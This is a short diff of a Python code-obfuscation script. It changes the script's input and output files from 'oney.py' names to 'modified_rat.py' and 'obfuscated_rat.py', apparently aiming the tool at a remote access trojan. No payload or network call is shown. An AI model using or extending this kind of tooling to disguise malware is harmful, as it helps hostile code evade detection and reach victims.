@@ -122,10 +122,10 @@ except {encryptstring('__import__("lzma").LZMAError', func= True)}:...
 
 def obfuscate_code():
     try:
-        # Set the target script to oney.py in the current directory
-        script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "modified_oney.py")
-        output_path = os.path.join(os.path.dirname(script_path), "obfuscated_oney.py")
-        
+        # Set the target script to rat.py in the current directory
+        script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "modified_rat.py")
+        output_path = os.path.join(os.path.dirname(script_path), "obfuscated_rat.py")
+
         # Read the target script
         with open(script_path, "r", encoding="utf-8") as f:
             code = f.read()
